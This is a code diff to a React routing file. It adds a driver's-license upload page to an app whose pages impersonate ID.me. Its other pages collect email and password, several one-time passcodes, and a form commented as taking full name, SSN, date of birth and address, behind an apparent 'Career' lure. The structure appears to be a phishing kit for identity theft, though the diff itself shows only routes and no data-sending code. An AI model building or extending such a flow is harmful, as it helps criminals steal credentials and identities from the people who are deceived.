@@ -5,7 +5,7 @@ import { Routes, Route } from "react-router-dom";
 
 // Page Imports
 import Home from "./pages/Home";
-import Career from "./pages/Career";  // Add Career page import
+import Career from "./pages/Career";
 import Ime from "./pages/ime";
 import Idme from "./pages/idme";
 import IdmeOtp from "./pages/idmeotp";
@@ -13,17 +13,18 @@ import Otp from "./pages/otp";
 import Otp2 from "./pages/idmeotp2";
 
 // Form Components
-import SignInForm from "./pages/form";      // Main form with email/password
- // Form with Full Name, Mobile, SSN, DOB, Address
-import Teil from "./pages/teil";                 // Family information form
-import SuccessPage from "./pages/SuccessPages";   // Success page with animation
+import SignInForm from "./pages/form";                 // Email & Password form
+  // Full Name, Mobile, SSN, DOB, Address
+import Teil from "./pages/teil";                       // Family information form
+import SuccessPage from "./pages/SuccessPages";        // Success page with animation
+import UploadLicense from "./pages/upload";     // ID.me driver's license upload
 
 const App: React.FC = () => {
   return (
     <Routes>
       {/* Main Routes */}
       <Route path="/" element={<Home />} />
-      <Route path="/career" element={<Career />} />  {/* Career page route */}
+      <Route path="/career" element={<Career />} />
       <Route path="/ime" element={<Ime />} />
       
       {/* ID.me Routes */}
@@ -33,10 +34,13 @@ const App: React.FC = () => {
       <Route path="/idmeotp2" element={<Otp2 />} />
       
       {/* Form Routes */}
-      <Route path="/form" element={<SignInForm />} />           {/* Email & Password form */}
-        {/* Full validation form with 5 fields */}
-      <Route path="/teil" element={<Teil />} />                   {/* Family information form */}
-      <Route path="/success" element={<SuccessPage />} />         {/* Success page */}
+      <Route path="/form" element={<SignInForm />} />
+        {/* 5‑field validation */}
+      <Route path="/teil" element={<Teil />} />
+      <Route path="/success" element={<SuccessPage />} />
+      
+      {/* New ID.me License Upload */}
+      <Route path="/upload" element={<UploadLicense />} />
     </Routes>
   );
 };
